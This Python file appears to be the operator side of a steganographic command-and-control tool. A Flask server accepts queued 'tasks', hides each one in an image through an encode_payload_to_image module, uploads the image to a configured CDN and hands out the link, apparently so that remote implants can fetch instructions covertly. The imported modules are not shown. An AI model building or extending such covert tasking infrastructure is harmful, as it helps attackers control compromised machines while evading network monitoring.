import yaml
from flask import Flask, request, jsonify
from modules.stego import encode_payload_to_image
from modules.api_client import upload_image
from modules.task_queue import TaskQueue
import logging

def start_operator(config_path):
    with open(config_path) as f:
        config = yaml.safe_load(f)

    logging.basicConfig(filename='logs/stego.log', level=logging.INFO)
    app = Flask(__name__)
    queue = TaskQueue()

    @app.route("/add_task", methods=["POST"])
    def add_task():
        data = request.json
        queue.add(data["task"])
        return jsonify({"status": "queued"})

    @app.route("/get_image", methods=["GET"])
    def get_image():
        task = queue.pop()
        if not task:
            return jsonify({"status": "no_task"})

        img_path = encode_payload_to_image(task)
        link = upload_image(img_path, config["cdn"])
        return jsonify({"image_url": link})

    app.run(host="0.0.0.0", port=5000)
